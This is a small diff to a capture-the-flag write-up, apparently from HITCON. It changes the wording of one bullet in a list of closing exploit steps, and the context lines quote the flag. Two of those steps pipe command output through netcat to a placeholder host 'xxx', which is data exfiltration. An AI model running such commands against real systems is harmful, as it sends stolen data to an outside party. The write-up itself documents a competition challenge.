@@ -35,4 +35,4 @@ Our final exploit payload for the `username` field is:
 - give up and just execute `ls /|nc xxx`
 - find and execute `/readflag|nc xxx`
 - `hitcon{if_you_dont_know_why_plz_check_mysql_max_allowed_packet}`
-- submit, be surprised about what might the flag possibly mean and move on
+- submit, be surprised about what the flag is talking about and move on
